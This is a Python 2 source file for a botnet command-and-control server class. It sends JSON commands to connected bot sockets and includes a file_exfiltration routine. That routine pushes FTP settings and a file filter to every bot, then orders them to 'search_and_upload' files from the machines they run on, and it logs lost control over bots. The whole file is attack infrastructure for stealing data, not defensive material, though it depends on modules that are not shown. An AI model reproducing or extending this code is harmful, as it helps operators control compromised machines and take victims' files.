#!/usr/bin/env python
# ServerCommand
import core
import copy
from config import server_desc

class ServerCMD(core.ServerCMD):
    def __init__(self, desc=server_desc):
        core.ServerCMD.__init__(self, desc)

    def forward_to_bots(self, sock, data):
        self.logger.info('start to echo_bots' )
        new_data = copy.deepcopy(data)
        new_data['event'] = data['bot_event']
        del new_data['bot_event']
        for client_sock in self.node.client_socks:
            self.node.send(client_sock, self._dump_json(new_data))

    def send_cmd_to_bots(self, cmd, bots=None, broke_socks=[]):
        self.logger.debug('send command to bots')
        sock_num = len(self.node.client_socks)
        if not bots: bots = range(sock_num)
        print 'sock_num', sock_num
        print 'broke_socks', broke_socks
        client_socks = self.node.client_socks
        # import pdb;pdb.set_trace()

        new_broke_socks = []
        self.logger.debug('cmd [%s] will be send to bots: [%s]'%(str(cmd), str(bots)))
        for bot_id in bots:
            if bot_id in broke_socks:
                continue
            client_sock = client_socks[bot_id]
            try:
                print 'result, ', self._dump_json(cmd)
                self.node.send(client_sock, self._dump_json(cmd))
                # self.node.send(client_sock, 'connect_ack')
                # print 'self.node.send finished'
            except IOError:
                self.logger.info('sock has been closed, cannot send command, \
                        you have lost control over this bot')
                new_broke_socks.append(bot_id)

        return new_broke_socks + broke_socks


    def file_exfiltration(self, sock, data):
        """
        command:
        """
        self.logger.info('start to issue file exfiltration command')
        bots = data.get('bots', None)

        # for client_sock in self.node.client_socks:
        cmd = copy.deepcopy(self.desc['ftp'])
        cmd['event'] = 'set_ftp_info'
        broke_socks = self.send_cmd_to_bots(cmd)

        cmd = copy.deepcopy(self.desc['file_filter'])
        cmd['event'] = 'set_file_filter'
        broke_socks = self.send_cmd_to_bots(cmd, broke_socks)

        cmd = dict(event='search_and_upload')
        broke_socks = self.send_cmd_to_bots(cmd, broke_socks)

        self.node.close_socks(broke_socks, 'client')
        self.logger.debug('broke_socks %s'%(str(broke_socks)))



